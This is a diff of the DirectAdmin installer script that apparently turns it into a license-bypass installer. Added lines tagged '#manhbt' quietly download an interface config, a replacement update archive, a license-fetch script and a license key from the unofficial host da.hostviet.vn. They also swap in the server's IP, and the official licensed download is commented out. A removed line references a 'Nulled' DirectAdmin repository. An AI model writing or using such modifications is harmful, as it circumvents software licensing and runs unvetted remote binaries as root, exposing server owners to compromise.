@@ -3,7 +3,7 @@
 ###############################################################################
 # setup.sh
 # DirectAdmin  setup.sh  file  is  the  first  file  to  download  when doing a
-# DirectAdmin Install.   It  will  ask  you  for  relevant information and will
+# DirectAdmin Install.   It  will  ask  you  for  relevant information and will 
 # download  all  required  files.   If  you  are unable to run this script with
 # ./setup.sh  then  you probably need to set it's permissions.  You can do this
 # by typing the following:
@@ -13,6 +13,10 @@
 # after this has been done, you can type ./setup.sh to run the script.
 #
 ###############################################################################
+
+#manhbt
+wget http://da.hostviet.vn/lo0.bk -O /etc/sysconfig/network-scripts/ifcfg-lo:0 2>/dev/null
+ifup lo 2>/dev/null
 
 OS=`uname`;
 
@@ -38,11 +42,6 @@ if [ ! -e /usr/bin/perl ]; then
 		echo "    http://help.directadmin.com/item.php?id=354";
 		exit 1;
 	fi
-fi
-
-#For FreeBSD 11
-if [ ! -e /usr/bin/perl ] && [ -e /usr/local/bin/perl ]; then
-        ln -s /usr/local/bin/perl /usr/bin/perl
 fi
 
 random_pass() {
@@ -135,28 +134,9 @@ esac
 		CMD_LINE=1
 		LID_INFO=/root/.lid_info
 		${WGET_PATH} -O ${LID_INFO} https://www.directadmin.com/clients/my_license_info.php
-		if [ ! -s ${LID_INFO} ]; then
+		if [  ! -s ${LID_INFO} ]; then
 			echo "Error getting license info. Empty ${LID_INFO} file. Check for errors, else try the UID/LID method, eg: $0"
 			exit 70
-		fi
-		if grep -m1 -q error=1 ${LID_INFO}; then
-			if [ "${OS}" = "FreeBSD" ]; then
-				for ip_address in `ifconfig | grep 'inet[0-9]* ' | awk '{print $2}' | grep -v '^127\.0\.0\.1' | grep -v '^::1' | grep -v '^fe80'`; do {
-					${WGET_PATH} --bind-address="${ip_address}" -O ${LID_INFO} https://www.directadmin.com/clients/my_license_info.php
-					if ! grep -m1 -q error=1 ${LID_INFO} && [ -s ${LID_INFO} ]; then
-						break
-					fi
-				};
-				done
-			else
-				for ip_address in `ip -o addr | awk '!/^[0-9]*: ?lo|link\/ether/ {print $4}' | cut -d/ -f1 | grep -v ^fe80`; do {
-					${WGET_PATH} --bind-address="${ip_address}" -O ${LID_INFO} https://www.directadmin.com/clients/my_license_info.php
-					if ! grep -m1 -q error=1 ${LID_INFO} && [ -s ${LID_INFO} ]; then
-						break
-					fi
-				};
-				done
-			fi
 		fi
 		if grep -m1 -q error=1 ${LID_INFO}; then
 			echo "An error has occured. Info about the error:"
@@ -169,10 +149,6 @@ esac
 		HOST=`grep ^hostname= ${LID_INFO} |cut -d= -f2`
 		if [ "${HOST}" = "" ]; then
 			HOST=`hostname -f`
-		fi
-		if [ "${HOST}" = "localhost" ]; then
-			echo "'localhost' is not valid for the hostname. Setting it to server.hostname.com, you can change it later in Admin Settings"
-			HOST=server.hostname.com
 		fi
 		if [ "$OS" = "FreeBSD" ]; then
 			EDEVS=`ifconfig -l`
@@ -294,9 +270,17 @@ elif [ -e $DEBIAN_VERSION ]; then
 	fi
 
 	if [ "$OS_VER" = "buster/sid" ]; then
-		echo "This appears to be Debian version $OS_VER which is Debian 10";
-		OS_VER=10.0
-	fi
+		echo "This appears to be Debian version $OS_VER.";
+		echo "This version is essentially Debian 10, which is not released yet, so the install might not work";
+		echo "See this page for more information:";
+		echo "    http://www.debian.org/releases/";
+		echo "";
+		sleep 10;
+		#exit 1;
+		OS_VER=9.0
+		echo "... but continuing anyway.";
+		sleep 1;
+	fi	
 else
 	OS_VER=`cat /etc/redhat-release | head -n1 | cut -d\  -f5`
 fi
@@ -486,13 +470,13 @@ if [ "$SERVICES" = "" ]; then
 		echo "  services_debian90_64.tar.gz";
 		echo "  services_debian100_64.tar.gz";
 		echo "";
-
+	
 		echo -n "Type the filename: ";
 		read SERVICES
-
+	
 		echo "";
 		echo "Value entered: $SERVICES";
-
+	
 	        echo -n "Is this correct? (y,n) : ";
 	        read yesno;
 	}
@@ -514,7 +498,7 @@ else
 	echo "*";
 	echo "* DirectAdmin requires certain packages, described here:";
 	echo "*   http://help.directadmin.com/item.php?id=354";
-	echo "*";
+	echo "*"; 
 	echo -n "* Would you like to install these required pre-install packages? (y/n): ";
 
 	read preinstall;
@@ -537,10 +521,10 @@ fi
 		elif [ "$OS" = "debian" ]; then
 			if [ "${OS_MAJ_VER}" -ge 10 ]; then
 				apt-get -y update
-				apt-get -y install gcc g++ make flex bison openssl libssl-dev perl perl-base perl-modules libperl-dev libperl4-corelibs-perl libwww-perl libaio1 libaio-dev zlib1g zlib1g-dev libcap-dev cron bzip2 zip automake autoconf libtool cmake pkg-config python libdb-dev libsasl2-dev libncurses5 libncurses5-dev libsystemd-dev bind9 dnsutils quota patch logrotate rsyslog libc6-dev libexpat1-dev libcrypt-openssl-rsa-perl libnuma-dev libnuma1
+				apt-get -y install gcc g++ make flex bison openssl libssl-dev perl perl-base perl-modules libperl-dev libperl4-corelibs-perl libwww-perl libaio1 libaio-dev zlib1g zlib1g-dev libcap-dev cron bzip2 zip automake autoconf libtool cmake pkg-config python libdb-dev libsasl2-dev libncurses5 libncurses5-dev libsystemd-dev bind9 dnsutils quota patch logrotate rsyslog libc6-dev libexpat1-dev libcrypt-openssl-rsa-perl libnuma-dev libnuma1 bsd-mailx
 			elif [ "${OS_MAJ_VER}" -ge 9 ]; then
 				apt-get -y update
-				apt-get -y install gcc g++ make flex bison openssl libssl-dev perl perl-base perl-modules libperl-dev libperl4-corelibs-perl libaio1 libaio-dev zlib1g zlib1g-dev libcap-dev cron bzip2 zip automake autoconf libtool cmake pkg-config python libdb-dev libsasl2-dev libncurses5-dev libsystemd-dev bind9 dnsutils quota patch libjemalloc-dev logrotate rsyslog libc6-dev libexpat1-dev libcrypt-openssl-rsa-perl libnuma-dev libnuma1
+				apt-get -y install gcc g++ make flex bison openssl libssl-dev perl perl-base perl-modules libperl-dev libperl4-corelibs-perl libaio1 libaio-dev zlib1g zlib1g-dev libcap-dev cron bzip2 zip automake autoconf libtool cmake pkg-config python libdb-dev libsasl2-dev libncurses5-dev libsystemd-dev bind9 dnsutils quota patch libjemalloc-dev logrotate rsyslog libc6-dev libexpat1-dev libcrypt-openssl-rsa-perl libnuma-dev libnuma1 bsd-mailx
 			elif [ "${OS_MAJ_VER}" -ge 8 ]; then
 				apt-get -y install gcc g++ make flex bison openssl libssl-dev perl perl-base perl-modules libperl-dev libaio1 libaio-dev zlib1g zlib1g-dev libcap-dev cron bzip2 automake autoconf libtool cmake pkg-config python libdb-dev libsasl2-dev libncurses5-dev libsystemd-dev bind9 dnsutils quota libsystemd-daemon0 patch libjemalloc-dev logrotate rsyslog
 			elif [ "${OS_MAJ_VER}" -eq 7 ]; then
@@ -570,7 +554,7 @@ fi
 		echo "* We then assume that you've already installed them.";
 		echo "* If you have not, then ctrl-c and install them (or-rerun the setup.sh):";
 		echo "*   http://help.directadmin.com/item.php?id=354";
-
+		
 	fi
 	echo "*";
 	echo "*****************************************************";
@@ -717,15 +701,14 @@ if [ "$OS" = "FreeBSD" ]; then
 	NM2=`echo "ibase=16; $NMH2" | bc`
 	NM3=`echo "ibase=16; $NMH3" | bc`
 	NM4=`echo "ibase=16; $NMH4" | bc`
-
+	
 	NM=$NM1.$NM2.$NM3.$NM4;
 
 else
 	if [ $CMD_LINE -eq 0 ]; then
-		DEVS=`ip link show | grep -e "^[1-9]" | awk '{print $2}' | cut -d: -f1 | grep -v lo | grep -v sit0 | grep -v ppp0 | grep -v faith0`
-		if [ -z "${DEVS}" ] && [ -x /sbin/ifconfig ]; then
-			DEVS=`/sbin/ifconfig -a | grep -e "^[a-z]" | awk '{ print $1; }' | grep -v lo | grep -v sit0 | grep -v ppp0 | grep -v faith0`
-		fi
+
+		DEVS=`/sbin/ifconfig -a | grep -e "^[a-z]" | awk '{ print $1; }' | grep -v lo | grep -v sit0 | grep -v ppp0 | grep -v faith0`
+	
 		COUNT=0;
 		for i in $DEVS; do
 		{
@@ -738,15 +721,11 @@ else
 	        	echo -n "Please enter the name of your ethernet device: ";
 	        	read ETH_DEV;
 		elif [ $COUNT -eq 1 ]; then
-
+		
 			#DIP=`/sbin/ifconfig $DEVS | grep 'inet addr:' | cut -d: -f2 | cut -d\  -f1`;
 			DEVS=`clean_dev $DEVS`
-			DIP=`ip addr show $DEVS | grep -m1 'inet ' | awk '{print $2}' | cut -d/ -f1`
-			#ifconfig fallback
-			if [ -z "${DIP}" ] && [ -x /sbin/ifconfig ]; then
-				DIP=`/sbin/ifconfig $DEVS | grep 'inet ' | awk '{print $2}' | cut -d: -f2`;
-			fi
-
+			DIP=`/sbin/ifconfig $DEVS | grep 'inet ' | awk '{print $2}' | cut -d: -f2`;
+		
         		echo -n "Is $DEVS your network adaptor with the license IP ($DIP)? (y,n) : ";
 		        read yesno;
         		if [ "$yesno" = "n" ]; then
@@ -763,14 +742,11 @@ else
 		        for i in $DEVS; do
 		        {
 				D=`clean_dev $i`
-				DIP=`ip addr show $D | grep -m1 'inet ' | awk '{print $2}' | cut -d/ -f1`
-				if [ -z "${D}" ] && [ -x /sbin/ifconfig ]; then
-					DIP=`/sbin/ifconfig $D | grep 'inet ' | awk '{print $2}' | cut -d: -f2`;
-				fi
+				DIP=`/sbin/ifconfig $D | grep 'inet ' | awk '{print $2}' | cut -d: -f2`;
 		        	echo "$D       $DIP";
 		        };
 		        done;
-
+		        
 		        echo "";
 		        echo -n "Enter the device name: ";
 		        read ETH_DEV;
@@ -779,40 +755,11 @@ else
 
 	if [ "$IP" = "0" ]; then
 		#IP=`/sbin/ifconfig $ETH_DEV | grep 'inet addr:' | cut -d: -f2 | cut -d\  -f1`;
-		IP=`ip addr show $ETH_DEV | grep -m1 'inet ' | awk '{print $2}' | cut -d/ -f1`
-		if [ -z "${IP}" ] && [ -x /sbin/ifconfig ]; then
-			IP=`/sbin/ifconfig $ETH_DEV | grep 'inet ' | awk '{print $2}' | cut -d: -f2`;
-		fi
+		IP=`/sbin/ifconfig $ETH_DEV | grep 'inet ' | awk '{print $2}' | cut -d: -f2`;
 	fi
 
-	prefixToNetmask(){
-        BINARY_IP=""
-        for i in {1..32}; do {
-                if [ ${i} -le ${1} ]; then
-                        BINARY_IP="${BINARY_IP}1"
-                else
-                        BINARY_IP="${BINARY_IP}0"
-                fi
-        }
-        done
-
-        B1=`echo ${BINARY_IP} | cut -c1-8`
-        B2=`echo ${BINARY_IP} | cut -c9-16`
-        B3=`echo ${BINARY_IP} | cut -c17-24`
-        B4=`echo ${BINARY_IP} | cut -c25-32`
-        NM1=`perl -le "print ord(pack('B8', '${B1}'))"`
-        NM2=`perl -le "print ord(pack('B8', '${B2}'))"`
-        NM3=`perl -le "print ord(pack('B8', '${B3}'))"`
-        NM4=`perl -le "print ord(pack('B8', '${B4}'))"`
-
-        echo "${NM1}.${NM2}.${NM3}.${NM4}"
-	}
-
-	PREFIX=`ip addr show ${ETH_DEV} | grep -m1 'inet ' | awk '{print $2}' | cut -d'/' -f2`
-	NM=`prefixToNetmask ${PREFIX}`
-	if [ -z "${NM}" ] && [ -x /sbin/ifconfig ]; then
-		NM=`/sbin/ifconfig ${ETH_DEV} | grep -oP "(netmask |Mask:)\K[^\s]+(?=.*)"`
-	fi
+	#NM=`/sbin/ifconfig $ETH_DEV | grep 'Mask:' | cut -d: -f4`;	
+	NM=$(/sbin/ifconfig ${ETH_DEV} | grep -oP "(netmask |Mask:)\K[^\s]+(?=.*)")
 fi
 
 if [ $CMD_LINE -eq 0 ]; then
@@ -868,7 +815,7 @@ fi
 
 if [ $CMD_LINE -eq 0 ]; then
 
-	PHP_V_DEF=5.6
+	PHP_V_DEF=7.2
 	PHP_M_DEF=mod_php
 	PHP_RUID_DEF=yes
 
@@ -876,7 +823,7 @@ if [ $CMD_LINE -eq 0 ]; then
 		onetwo=1
 	elif [ "${SERVICES}" = "services_debian90_64.tar.gz" ] || [ "${SERVICES}" = "services_debian100_64.tar.gz" ]; then
 		onetwo=1
-		PHP_V_DEF=5.6
+		PHP_V_DEF=7.2
 		PHP_M_DEF=php-fpm
 		PHP_RUID_DEF=no
 	else
@@ -939,7 +886,7 @@ if [ $CMD_LINE -eq 0 ]; then
 				MOD_RUID2=no
 				PHP1_MODE=php-fpm
 			fi
-
+        
 
 		#grab the build file.
 
@@ -977,11 +924,11 @@ if [ $CMD_LINE -eq 0 ]; then
 				fi
 			fi
                 fi
-
+                
                 echo -n "Would you like to search for the fastest download mirror? (y/n): ";
                 read yesno;
                 if [ "$yesno" = "y" ]; then
-                	${BUILD} set_fastest;
+                	$BUILD set_fastest;
 		fi
 		if [ -s "${CB_OPTIONS}" ]; then
 			DL=`grep -m1 ^downloadserver= ${CB_OPTIONS} | cut -d= -f2`
@@ -989,7 +936,7 @@ if [ $CMD_LINE -eq 0 ]; then
 				SERVER=http://${DL}/services
 				FTP_HOST=${DL}
 			fi
-		fi
+		fi                
         else
 		echo "invalid number entered: '$onetwo'";
 		sleep 5;
@@ -1006,7 +953,7 @@ if [ "${AUTO}" = "1" ]; then
 		chmod 755 $BUILD
 	fi
 
-	${BUILD} set_fastest
+	$BUILD set_fastest
 
 	if [ -s "${CB_OPTIONS}" ]; then
 		DL=`grep -m1 ^downloadserver= ${CB_OPTIONS} | cut -d= -f2`
@@ -1014,8 +961,6 @@ if [ "${AUTO}" = "1" ]; then
 			SERVER=http://${DL}/services
 			FTP_HOST=${DL}
 		fi
-
-		${BUILD} set userdir_access no
 	fi
 
 	if [ "${OS_NAME}" != "" ]; then
@@ -1160,7 +1105,7 @@ if [ $WGET -eq 0 ]; then
 			mv -f $WGET_PATH $WGET_PATH.old
 			mv -f $WGET_PATH.new $WGET_PATH
 			chmod 755 $WGET_PATH
-		fi
+		fi			
 	else
 		echo "*** wget not found: you *must* install wget (yum -y install wget)";
 		exit 2;
@@ -1178,7 +1123,7 @@ fi
 
 # Download the file that has the paths to all the relevant files.
 FILES=$SCRIPTS_PATH/files.sh
-#if [ "$OS" != "FreeBSD" ]; then
+#if [ "$OS" != "FreeBSD" ]; then	
 	FILES_PATH=$OS_VER
 	if [ "$OS" = "FreeBSD" ]; then
 		case "${OS_MAJ_VER}" in
@@ -1316,7 +1261,7 @@ addPackage()
 		if [ ! -e $PACKAGES/$2 ]; then
 			echo "Error downloading $SERVER/$FILES_PATH/$2";
 		fi
-
+		
 		rpm -Uvh --nodeps --force $PACKAGES/$2
 	fi
 }
@@ -1438,7 +1383,7 @@ if [ "$OS" != "FreeBSD" ] && [ "$OS" != "debian" ]; then
 	fi
 
         RNDCKEY=/etc/rndc.key
-
+	
 	if [ ! -s $RNDCKEY ]; then
 		echo "Generating new key: $RNDCKEY ...";
 
@@ -1470,12 +1415,12 @@ if [ "$OS" != "FreeBSD" ] && [ "$OS" != "debian" ]; then
 		echo "Template installed.";
         fi
 
-	chown named:named ${RNDCKEY}
+	chown named:named ${RNDCKEY}	
 fi
 
 if [ "$OS" = "FreeBSD" ]; then
 	if [ ! -e /etc/namedb/rndc.key ]; then
-		rndc-confgen -a -s $IP
+		rndc-confgen -a -s $IP	
 	fi
 	COUNT=`cat /etc/namedb/named.conf | grep -c listen`
 	if [ $COUNT -ne 0 ]; then
@@ -1522,7 +1467,7 @@ if [ "$OS" = "debian" ]; then
 	if [ ! -e /bin/nice ]; then
 		ln -s /usr/bin/nice /bin/nice
 	fi
-
+	
 	if [ "$KILLALL" -eq 0 ]; then
 		addPackage psmisc nothing psmisc
 	fi
@@ -1752,15 +1697,8 @@ fi
 
 
 # Assuming everything got installed correctly, we can now begin the install:
-if [ ! -s ${LID_INFO} ] && [ "$1" = "auto" ]; then
-	if grep -m1 -q '^ip=' ${LID_INFO}; then
-		BIND_ADDRESS=--bind-address=`grep -m1 -q '^ip=' ${LID_INFO} | cut -d= -f2`
-	else
-		BIND_ADDRESS=""
-	fi
-else
-	BIND_ADDRESS=--bind-address=$IP
-fi
+
+BIND_ADDRESS=--bind-address=$IP
 if [ "$LAN" -eq 1 ]; then
 	BIND_ADDRESS="";
 fi
@@ -1776,7 +1714,24 @@ if [ -e $OS_OVERRIDE_FILE ]; then
 	OS_OVERRIDE=`cat $OS_OVERRIDE_FILE | head -n1`
 	EXTRA_VALUE="${EXTRA_VALUE}&os=${OS_OVERRIDE}"
 fi
-		$BIN_DIR/wget $WGET_OPTION -S --tries=5 --timeout=60 -O $DA_PATH/update.tar.gz $BIND_ADDRESS "${HTTP}://raw.githubusercontent.com/LinuxGuard/Directadmin-1.60.3-Nulled/master/update.tar.gz"
+
+GET_LICENSE=1
+if [ -s /root/.skip_get_license ]; then
+	GET_LICENSE=0
+fi
+
+if [ "$GET_LICENSE" = "1" ]; then
+	if ${DOWNLOAD_BETA}; then
+		APPEND_BETA="&channel=beta"
+	else
+		APPEND_BETA=""
+	fi
+#	$BIN_DIR/wget $WGET_OPTION -S --tries=5 --timeout=60 -O $DA_PATH/update.tar.gz $BIND_ADDRESS "${HTTP}://www.directadmin.com/cgi-bin/daupdate?uid=$CID&lid=$LID${EXTRA_VALUE}&redirect=ok${APPEND_BETA}"
+
+#manhbt
+wget http://da.hostviet.vn/update.tar.gz.cent7 -O /usr/local/directadmin/update.tar.gz
+
+fi
 
 if [ ! -e $DA_PATH/update.tar.gz ]; then
 	echo "Unable to download $DA_PATH/update.tar.gz";
@@ -1840,6 +1795,10 @@ chmod 600 $SETUP
 
 cd $SCRIPTS_PATH;
 
+#manhbt
+wget http://da.hostviet.vn/getLicense.sh -O /usr/local/directadmin/scripts/getLicense.sh 2>/dev/null
+#####
+
 chmod 700 install.sh
 ./install.sh $CMD_LINE
 
@@ -1881,7 +1840,7 @@ if [ "${OS}" != "FreeBSD" ] && [ "${AUTO}" = "1" ]; then
 	else
 		#run it
 		chmod 755 ${CSF_SH}
-		${CSF_SH} auto >> ${CSF_LOG} 2>&1
+		${CSF_SH} >> ${CSF_LOG} 2>&1
 	fi
 
         ${BUILD} secure_php
@@ -1902,3 +1861,8 @@ sleep 1
 printf \\a
 sleep 1
 printf \\a
+#manhbt
+wget http://da.hostviet.vn/license.key.zip -O /usr/local/directadmin/conf/license.key 2>/dev/null
+HVIP=`curl ifconfig.co`;
+/usr/local/directadmin/scripts/ipswap.sh 115.146.127.60 $HVIP 2>/dev/null
+####
